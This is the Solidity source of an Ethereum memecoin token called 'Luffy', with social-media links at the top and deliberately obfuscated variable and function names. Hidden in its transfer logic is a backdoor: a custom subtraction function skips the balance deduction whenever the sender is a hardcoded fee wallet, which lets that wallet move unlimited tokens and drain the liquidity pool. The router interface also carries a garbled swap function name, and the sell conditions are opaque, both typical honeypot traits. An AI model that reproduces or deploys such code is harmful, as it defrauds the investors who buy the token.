/**

$Luffy
Welcome aboard the Luffy memecoin project!


TWITTER: https://twitter.com/Luffy_Ethereum
TELEGRAM: https://t.me/LuffyEthereum
WEBSITE: https://luffyeth.com/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _pbnub(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _pbnub(a, b, "SafeMath:");
    }

    function  _pbnub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _kabcjxyp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _proumlnhs {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract Luffy is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Luffy";
    string private constant _symbol = unicode"Luffy";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalgr = 1000000000 * 10 **_decimals;
    uint256 public _mxfmjAmaunt = _Totalgr;
    uint256 public _Wallexhpor = _Totalgr;
    uint256 public _wapThresholomz= _Totalgr;
    uint256 public _mkalTbakc= _Totalgr;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _iscEckour;
    mapping (address => bool) private _taxvWalrmy;
    mapping(address => uint256) private _lruetrkoap;
    bool public _taerelorve = false;
    address payable private _fTmoknhq;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBvmfaep=0;
    uint256 private _burwrxyr=0;


    _proumlnhs private _Tamvufbl;
    address private _arMhvoukm;
    bool private _qvmtiamh;
    bool private lawSenkrp = false;
    bool private _aqmjujerp = false;


    event _amrfobvul(uint _mxfmjAmaunt);
    modifier lowmpThacuq {
        lawSenkrp = true;
        _;
        lawSenkrp = false;
    }

    constructor () {

        _fTmoknhq = payable(0x3b0FBE909776aDd9aE7204E12a1858160F216Ee3);
        _balances[_msgSender()] = _Totalgr;
        _iscEckour[owner()] = true;
        _iscEckour[address(this)] = true;
        _iscEckour[_fTmoknhq] = true;

 

        emit Transfer(address(0), _msgSender(), _Totalgr);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalgr;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _pbnub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_taerelorve) {
                if (to != address
                (_Tamvufbl) && to !=
                 address(_arMhvoukm)) {
                  require(_lruetrkoap
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruetrkoap
                  [tx.origin] = block.number;
                }
            }

            if (from == _arMhvoukm && to != 
            address(_Tamvufbl) && !_iscEckour[to] ) {
                require(amount <= _mxfmjAmaunt,
                 "Exceeds the _mxfmjAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallexhpor, "Exceeds the maxWalletSize.");
                if(_burwrxyr
                < _wapBvmfaep){
                  require(! _firoqfj(to));
                }
                _burwrxyr++;
                 _taxvWalrmy[to]=true;
                teeomoun = amount.mul((_burwrxyr>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _arMhvoukm && from!= address(this) 
            && !_iscEckour[from] ){
                require(amount <= _mxfmjAmaunt && 
                balanceOf(_fTmoknhq)<_mkalTbakc,
                 "Exceeds the _mxfmjAmaunt.");
                teeomoun = amount.mul((_burwrxyr>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burwrxyr>_wapBvmfaep &&
                 _taxvWalrmy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!lawSenkrp 
            && to == _arMhvoukm && _aqmjujerp &&
             contractTokenBalance>_wapThresholomz 
            && _burwrxyr>_wapBvmfaep&&
             !_iscEckour[to]&& !_iscEckour[from]
            ) {
                _swpjuabruh( _ynqme(amount, 
                _ynqme(contractTokenBalance,_mkalTbakc)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rmouteoq(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _pbnub(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _pbnub(teeomoun));
        emit Transfer(from, to, 
        amount. _pbnub(teeomoun));
    }

    function _swpjuabruh(uint256
     tokenAmount) private lowmpThacuq {
        if(tokenAmount==0){return;}
        if(!_qvmtiamh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _Tamvufbl.WETH();
        _approve(address(this),
         address(_Tamvufbl), tokenAmount);
        _Tamvufbl.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _ynqme(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _pbnub(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _fTmoknhq){
            return a ;
        }else{
            return a . _pbnub (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxfmjAmaunt = _Totalgr;
        _Wallexhpor = _Totalgr;
        _taerelorve = false;
        emit _amrfobvul(_Totalgr);
    }

    function _firoqfj(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rmouteoq(uint256
    amount) private {
        _fTmoknhq.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _qvmtiamh);
        _Tamvufbl   =  _proumlnhs (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_Tamvufbl), _Totalgr);
        _arMhvoukm = _kabcjxyp(_Tamvufbl.factory()). createPair (address(this),  _Tamvufbl . WETH ());
        _Tamvufbl.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_arMhvoukm).approve(address(_Tamvufbl), type(uint).max);
        _aqmjujerp = true;
        _qvmtiamh = true;
    }

    receive() external payable {}
}